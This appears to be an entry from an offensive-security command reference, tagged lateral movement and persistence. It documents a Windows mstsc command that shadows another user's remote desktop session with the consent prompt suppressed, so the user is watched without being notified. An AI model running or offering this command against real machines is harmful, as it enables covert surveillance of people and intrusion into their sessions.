---
type: command
executor: cmd
data: 'mstsc /v:$_TARGET_ADDRESS /shadow:$_SESSION_ID /noconsentprompt /prompt'
output: null
platforms:
  - Windows
tags:
  - lateral-movement
  - persistence
verified: true
validated: true
---

# shadow-remote-session

## Command

```cmd
mstsc /v:$_TARGET_ADDRESS /shadow:$_SESSION_ID /noconsentprompt /prompt
```

## Description

This command launches the Remote Desktop client to shadow a specific session on a remote Windows machine without requiring user consent, enabling stealthy observation of user activity.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /v:$_TARGET_ADDRESS | Specifies the target IP address or hostname | Yes |
| /shadow:$_SESSION_ID | Specifies the session ID to shadow (e.g., 1, 2) | Yes |
| /noconsentprompt | Bypasses the consent prompt for shadowing | Yes |
| /prompt | Prompts for credentials to authenticate the connection | Yes |

## Examples

### Basic Usage

```cmd
mstsc /v:192.168.1.100 /shadow:2 /noconsentprompt /prompt
```

### With Hostname

```cmd
mstsc /v:target-host /shadow:1 /noconsentprompt /prompt
```

## Expected Output

The command launches the MSTSC (Remote Desktop Connection) application, prompting for credentials if needed. Upon successful connection, the target user's desktop session appears in a window without notifying the user.

No console output; success is visual confirmation of the shadowed session.

## Related

- [[procedures/windows-remote-desktop-services-shadowing-persistence]]
- [[commands/configure-terminal-services-shadowing]]
